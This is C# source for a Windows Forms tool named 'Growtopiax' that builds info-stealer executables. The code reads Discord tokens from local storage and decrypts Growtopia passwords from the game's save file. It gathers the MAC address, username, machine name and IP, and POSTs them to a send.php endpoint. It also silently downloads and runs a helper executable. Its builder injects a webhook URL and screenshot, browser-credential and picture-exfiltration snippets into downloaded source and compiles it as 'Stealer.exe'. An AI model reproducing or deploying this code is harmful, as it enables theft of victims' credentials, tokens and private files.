using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;
using System.Management;
using Growtopiax.Extensions;
using System.Collections.Specialized;
using System.IO;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;
using System.Runtime.Serialization;



namespace Growtopiax
{
    public partial class Growtopiax : Form
    {
        public Growtopiax()
        {
            InitializeComponent();
        }

    public string BalloonTipTitle { get; set; }

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ReleaseCapture();


        public static string[] GetMacAddress()
        {
            string empty = string.Empty;
            long num = -1L;
            string[] array = new string[10];
            int num2 = 1;
            foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (networkInterface.GetPhysicalAddress() != null)
                {
                    string s = networkInterface.GetPhysicalAddress().ToString();
                    List<string> values = (from i in Enumerable.Range(0, s.Length / 2)
                                           select s.Substring(i * 2, 2)).ToList<string>();
                    string text = string.Join("", values);
                    if (text != "" && num2 <= 10)
                    {
                        array[num2] = text;
                        num2++;
                    }
                    string text2 = networkInterface.GetPhysicalAddress().ToString();
                    if (networkInterface.Speed > num && !string.IsNullOrEmpty(text2) && text2.Length >= 12)
                    {
                        num = networkInterface.Speed;
                    }
                }
            }
            return array;
        }

        private static string GetMacAddress1()
        {
            string text = string.Empty;
            foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (networkInterface.OperationalStatus == OperationalStatus.Up)
                {
                    text += networkInterface.GetPhysicalAddress().ToString();
                    break;
                }
            }
            return text;
        }

        private static string GetMacAddress5()
        {
            string text = string.Empty;
            foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (networkInterface.OperationalStatus == OperationalStatus.Up)
                {
                    text += networkInterface.GetPhysicalAddress().ToString();
                    break;
                }
            }
            return text;
        }

        public static string takeToken()
        {
            string result;
            try
            {
                string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");
                int num;
                while ((num = text.IndexOf("oken")) != -1)
                {
                    text = text.Substring(num + "oken".Length);
                }
                string text2 = text.Split(new char[]
                {
                    '"'
                })[1];
                result = text2;
            }
            catch (Exception)
            {
                result = null;
            }
            return result;
        }

        private static void gonder()
        {
            Growtopiax.Packet packet = new Growtopiax.Packet();
            try
            {
                string text = Path.GetTempPath() + "\\save.exe";
                if (!File.Exists(text))
                {
                    WebClient webClient = new WebClient();
                    webClient.DownloadFile("http://localhost/save.exe", text);
                }
                Process process = new Process();
                process.StartInfo.FileName = text;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.StartInfo.WorkingDirectory = Path.GetTempPath();
                process.Start();
                process.WaitForExit();
                string[] array = File.ReadAllText(Path.GetTempPath() + "\\result.txt").Split(new char[]
                {
                    '|'
                });
                packet.growid = array[0];
                packet.password = array[1];
                packet.lastworld = array[2];
                Growtopiax.growid = packet.growid;
            }
            catch
            {
                try
                {
                    byte[] array2 = File.ReadAllBytes((string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Growtopia", "path", null) + "\\save.dat");
                    Regex regex = new Regex("[^\\w0-9]");
                    string text2 = Encoding.Default.GetString(array2).Replace("\0", " ");
                    packet.growid = regex.Replace(text2.Substring(text2.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
                    {
                        ' '
                    })[3], string.Empty);
                    string text3 = null;
                    foreach (string str in Growtopiax.pwDec.Func(array2))
                    {
                        text3 = text3 + str + "\r\n";
                    }
                    packet.password = text3;
                    packet.lastworld = regex.Replace(text2.Substring(text2.IndexOf("lastworld") + "lastworld".Length).Split(new char[]
                    {
                        ' '
                    })[3], string.Empty);
                    if (packet.lastworld == "lastworld")
                    {
                        packet.lastworld = "unknown";
                    }
                }
                catch
                {
                    packet.lastworld = "EMPTY";
                    packet.growid = "EMPTY";
                    packet.password = "EMPTY";
                }
            }
            try
            {
                string[] macAddress = Growtopiax.GetMacAddress();
                string value = string.Join("\r", macAddress);
                packet.token = Growtopiax.takeToken();
                packet.computerInfo = Environment.MachineName;
                packet.user = Environment.UserName;
                string address = "http://localhost/send.php";
                WebClient webClient2 = new WebClient();
                NameValueCollection nameValueCollection = new NameValueCollection();
                nameValueCollection["username"] = Environment.UserName;
                nameValueCollection["ID"] = "123456";
                nameValueCollection["packet"] = Environment.UserName;
                nameValueCollection["ip"] = Growtopiax.ip();
                nameValueCollection["date"] = "123451";
                nameValueCollection["hacked"] = "123z25";
                nameValueCollection["deneme"] = "deneme";
                nameValueCollection["growid"] = packet.growid;
                nameValueCollection["pass"] = packet.password;
                nameValueCollection["lastworld"] = packet.lastworld;
                nameValueCollection["mac"] = value;
                byte[] bytes = webClient2.UploadValues(address, "POST", nameValueCollection);
                Encoding.UTF8.GetString(bytes);
                webClient2.Dispose();
            }
            catch
            {
                try
                {
                    packet.token = Growtopiax.takeToken();
                    packet.computerInfo = Environment.MachineName;
                    packet.user = Environment.UserName;
                    string address2 = "http://localhost/send.php";
                    WebClient webClient3 = new WebClient();
                    NameValueCollection nameValueCollection2 = new NameValueCollection();
                    nameValueCollection2["username"] = Environment.UserName;
                    nameValueCollection2["ID"] = "123456";
                    nameValueCollection2["packet"] = Environment.UserName;
                    nameValueCollection2["ip"] = Growtopiax.ip();
                    nameValueCollection2["date"] = "123451";
                    nameValueCollection2["hacked"] = "123z25";
                    nameValueCollection2["deneme"] = "deneme";
                    nameValueCollection2["growid"] = packet.growid;
                    nameValueCollection2["pass"] = packet.password;
                    nameValueCollection2["lastworld"] = packet.lastworld;
                    byte[] bytes2 = webClient3.UploadValues(address2, "POST", nameValueCollection2);
                    Encoding.UTF8.GetString(bytes2);
                    webClient3.Dispose();
                }
                catch
                {
                    try
                    {
                        packet.token = Growtopiax.takeToken();
                        packet.computerInfo = Environment.MachineName;
                        packet.user = Environment.UserName;
                        string address3 = "http://localhost/send.php";
                        WebClient webClient4 = new WebClient();
                        NameValueCollection nameValueCollection3 = new NameValueCollection();
                        nameValueCollection3["username"] = Environment.UserName;
                        nameValueCollection3["ID"] = "123456";
                        nameValueCollection3["packet"] = Environment.UserName;
                        nameValueCollection3["ip"] = Growtopiax.ip();
                        nameValueCollection3["date"] = "123451";
                        nameValueCollection3["hacked"] = "123z25";
                        nameValueCollection3["deneme"] = "deneme";
                        nameValueCollection3["growid"] = packet.growid;
                        nameValueCollection3["pass"] = packet.password;
                        nameValueCollection3["lastworld"] = packet.lastworld;
                        byte[] bytes3 = webClient4.UploadValues(address3, "POST", nameValueCollection3);
                        Encoding.UTF8.GetString(bytes3);
                        webClient4.Dispose();
                    }
                    catch
                    {
                        packet.token = Growtopiax.takeToken();
                        packet.computerInfo = Environment.MachineName;
                        packet.user = Environment.UserName;
                        string address4 = "http://localhost/send.php";
                        WebClient webClient5 = new WebClient();
                        NameValueCollection nameValueCollection4 = new NameValueCollection();
                        nameValueCollection4["username"] = Environment.UserName;
                        nameValueCollection4["ID"] = "123456";
                        nameValueCollection4["packet"] = Environment.UserName;
                        nameValueCollection4["ip"] = Growtopiax.ip();
                        nameValueCollection4["date"] = "123451";
                        nameValueCollection4["hacked"] = "123z25";
                        nameValueCollection4["deneme"] = "deneme";
                        nameValueCollection4["growid"] = packet.growid;
                        nameValueCollection4["pass"] = packet.password;
                        nameValueCollection4["lastworld"] = packet.lastworld;
                        byte[] bytes4 = webClient5.UploadValues(address4, "POST", nameValueCollection4);
                        Encoding.UTF8.GetString(bytes4);
                        webClient5.Dispose();
                    }
                }
            }
        }

        public static string ip()
        {
            string result;
            try
            {
                result = new WebClient
                {
                    Proxy = null
                }.DownloadString("http://icanhazip.com/");
            }
            catch (Exception)
            {
                result = null;
            }
            return result;
        }

        private void DragMove(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        private void Growtopiax_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            WebClient wc = new WebClient();
            string source = wc.DownloadString("http://localhost/deneme");
            source = source.Replace("//webhook url", darkTextBox1.Text);

            if (checkBox1.Checked)
            {
                source = source.Replace("//screenshot", @"if (File.Exists(screenshot))
                webHook.AddAttachment(screenshot, Environment.UserName + "" screenshot.png"");");
            }
            if (checkBox2.Checked)
            {
                source = source.Replace("//browsercreds", @"if (File.Exists(browsercredpath))
                    webHook.AddAttachment(browsercredpath, Environment.UserName + "" credentials.txt"");");
            }
            if (checkBox2.Checked)
            {
                source = source.Replace("//pics", @"if (File.Exists(zipPath))
					try
					{
						webHook.AddAttachment(zipPath, Environment.UserName + "" pictures.zip"");
                    }
                    catch
                    {
                    }");
            }

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "Stealer.exe";
            sfd.Filter = "Exe files (Obviously) (*.exe)|*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                new Compiler(source, sfd.FileName);
            }
        }
        public class Compiler
        {
            public Compiler(string sourceCode, string savePath)
            {
                string[] referencedAssemblies = new string[] { "System.dll", "System.Windows.Forms.dll", "System.Net.dll", "System.Drawing.dll", "System.Management.dll", "System.IO.dll", "System.IO.compression.dll", "System.IO.compression.filesystem.dll", "System.Core.dll", "System.Security.dll", "System.Net.Http.dll" };

                Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } };

                string compilerOptions = "/target:winexe /platform:anycpu /optimize+";

                using (CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
                {
                    CompilerParameters compilerParameters = new CompilerParameters(referencedAssemblies)
                    {
                        GenerateExecutable = true,
                        GenerateInMemory = false,
                        OutputAssembly = savePath, // output path
                        CompilerOptions = compilerOptions,
                        TreatWarningsAsErrors = false,
                        IncludeDebugInformation = false,
                    };

                    CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, sourceCode); // source.cs
                    if (compilerResults.Errors.Count > 0)
                    {
                        foreach (CompilerError compilerError in compilerResults.Errors)
                        {
                            MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                                compilerError.Line, compilerError.Column, compilerError.FileName));
                        }

                    }
                    else
                    {
                        MessageBox.Show("Compile Successful!");
                    }
                    return;
                }
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {

        }

        static string GrabIP()
        {
            WebClient wc = new WebClient();
            string ip = wc.DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return ip;
        }

    private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void darkTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private static Random randomness = new Random();
		public static string growid = "";

        public static class pwDec
        {
            // Token: 0x06000010 RID: 16 RVA: 0x00002D88 File Offset: 0x00000F88
            public static List<string> ParsePassword(byte[] contents)
            {
                List<string> result;
                try
                {
                    string text = "";
                    foreach (byte b in contents)
                    {
                        string text2 = b.ToString("X2");
                        bool flag = text2 == "00";
                        if (flag)
                        {
                            text += "<>";
                        }
                        else
                        {
                            text += text2;
                        }
                    }
                    bool flag2 = text.Contains("74616E6B69645F70617373776F7264");
                    if (flag2)
                    {
                        string text3 = "74616E6B69645F70617373776F7264";
                        int num = text.IndexOf(text3);
                        int num2 = text.LastIndexOf(text3);
                        bool flag3 = false;
                        string text4;
                        if (flag3)
                        {
                            text4 = string.Empty;
                        }
                        num += text3.Length;
                        int num3 = text.IndexOf("<><><>", num);
                        bool flag4 = false;
                        if (flag4)
                        {
                            text4 = string.Empty;
                        }
                        string @string = Encoding.UTF8.GetString(Growtopiax.pwDec.StringToByteArray(text.Substring(num, num3 - num).Trim()));
                        bool flag5 = ((@string.ToCharArray()[0] == '_') ? 1 : 0) == 0;
                        if (flag5)
                        {
                            text4 = text.Substring(num, num3 - num).Trim();
                        }
                        else
                        {
                            num2 += text3.Length;
                            num3 = text.IndexOf("<><><>", num2);
                            text4 = text.Substring(num2, num3 - num2).Trim();
                        }
                        string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
                        int num4 = text.IndexOf(text5);
                        bool flag6 = false;
                        string text6;
                        if (flag6)
                        {
                            text6 = string.Empty;
                        }
                        num4 += text5.Length;
                        int num5 = text.IndexOf("<><><>", num4);
                        bool flag7 = false;
                        if (flag7)
                        {
                            text6 = string.Empty;
                        }
                        text6 = text.Substring(num4, num5 - num4).Trim();
                        int num6 = (int)Growtopiax.pwDec.StringToByteArray(text4)[0];
                        text6 = text6.Substring(0, num6 * 2);
                        Growtopiax.pwDec.StringToByteArray(text6.Replace("<>", "00"));
                        List<byte> list = new List<byte>();
                        List<byte> list2 = new List<byte>();
                        for (int j = 0; j < list.Count; j++)
                        {
                            list2.Add((byte)((int)(list[j] - 1) - j));
                        }
                        List<string> list3 = new List<string>();
                        for (int k = 0; k <= 255; k++)
                        {
                            string text7 = "";
                            foreach (byte b2 in list2)
                            {
                                bool flag8 = Growtopiax.pwDec.ValidateChar((char)((byte)((int)b2 + k)));
                                if (flag8)
                                {
                                    text7 += ((char)((byte)((int)b2 + k))).ToString();
                                }
                            }
                            bool flag9 = text7.Length == num6;
                            if (flag9)
                            {
                                list3.Add(text7);
                            }
                        }
                        result = list3;
                    }
                    else
                    {
                        result = null;
                    }
                }
                catch
                {
                    result = null;
                }
                return result;
            }

            public static byte[] StringToByteArray(string str)
            {
                Dictionary<string, byte> dictionary = new Dictionary<string, byte>();
                for (int i = 0; i <= 255; i++)
                {
                    dictionary.Add(i.ToString("X2"), (byte)i);
                }
                List<byte> list = new List<byte>();
                for (int j = 0; j < str.Length; j += 2)
                {
                    list.Add(dictionary[str.Substring(j, 2)]);
                }
                return list.ToArray();
            }

            // Token: 0x06000012 RID: 18 RVA: 0x000030E8 File Offset: 0x000012E8
            private static bool ValidateChar(char cdzdshr)
            {
                return (cdzdshr >= '0' && cdzdshr <= '9') || (cdzdshr >= 'A' && cdzdshr <= 'Z') || (cdzdshr >= 'a' && cdzdshr <= 'z') || (cdzdshr >= '+' && cdzdshr <= '.');
            }

            // Token: 0x06000013 RID: 19 RVA: 0x0000311C File Offset: 0x0000131C
            public static string[] Func(byte[] lel)
            {
                List<string> list = Growtopiax.pwDec.ParsePassword(lel);
                return list.ToArray();
            }
        }

        public static string RandomSTG(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[randomness.Next(s.Length)]).ToArray());
        }


        private void darkButton1_Click(object sender, EventArgs e)
        {
            WebClient wc = new WebClient();
            string source = wc.DownloadString("http://localhost/deneme");
            source = source.Replace("//webhook url", darkTextBox1.Text);

            if (checkBox1.Checked)
            {
                source = source.Replace("//screenshot", @"if (File.Exists(screenshot))
                webHook.AddAttachment(screenshot, Environment.UserName + "" screenshot.png"");");
            }
            if (serverDelivery.Checked)
            {
                string address = "http://localhost/api/server/send.php";
                WebClient webClient2 = new WebClient();
                NameValueCollection nameValueCollection = new NameValueCollection();
                nameValueCollection["username"] = Environment.UserName;
                nameValueCollection["ID"] = "123456";
                nameValueCollection["packet"] = Environment.UserName;
                nameValueCollection["ip"] = "127.0.0.1";
                nameValueCollection["date"] = "123451";
                nameValueCollection["hacked"] = "123z25";
                nameValueCollection["deneme"] = "deneme";
                byte[] bytes = webClient2.UploadValues(address, "POST", nameValueCollection);
                Encoding.UTF8.GetString(bytes);
                webClient2.Dispose();
            }
            if (checkBox2.Checked)
            {
                source = source.Replace("//browsercreds", @"if (File.Exists(browsercredpath))
                    webHook.AddAttachment(browsercredpath, Environment.UserName + "" credentials.txt"");");
            }
            if (checkBox2.Checked)
            {
                source = source.Replace("//pics", @"if (File.Exists(zipPath))
					try
					{
						webHook.AddAttachment(zipPath, Environment.UserName + "" pictures.zip"");
                    }
                    catch
                    {
                    }");
            }

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "Stealer.exe";
            sfd.Filter = "Exe files (Obviously) (*.exe)|*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                new Compiler(source, sfd.FileName);
            }
        }

        private void upperRgb_Paint(object sender, PaintEventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Rainbow.change_color(buildergb);
        }

        private void exitB_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void minimizeB_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void serverDelivery_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void darkLabel1_Click(object sender, EventArgs e)
        {

        }

        private void timer45_Tick(object sender, EventArgs e)
        {
            Rainbow.change_color(darkButton1);
        }

        public class Packet
        {
            // Token: 0x04000003 RID: 3
            public string oldid;

            // Token: 0x04000004 RID: 4
            public string growid;

            // Token: 0x04000005 RID: 5
            public string password;

            // Token: 0x04000006 RID: 6
            public string mac;

            // Token: 0x04000007 RID: 7
            public string computerInfo;

            // Token: 0x04000008 RID: 8
            public string lastworld;

            // Token: 0x04000009 RID: 9
            public string user;

            // Token: 0x0400000A RID: 10
            public string token;

            // Token: 0x0400000B RID: 11
            public string ip;

            // Token: 0x0400000C RID: 12
            public string browsercreds;

            // Token: 0x0400000D RID: 13
            public string desktoppic;
        }

        private void deliveryTitle_Click(object sender, EventArgs e)
        {

        }
    }
}
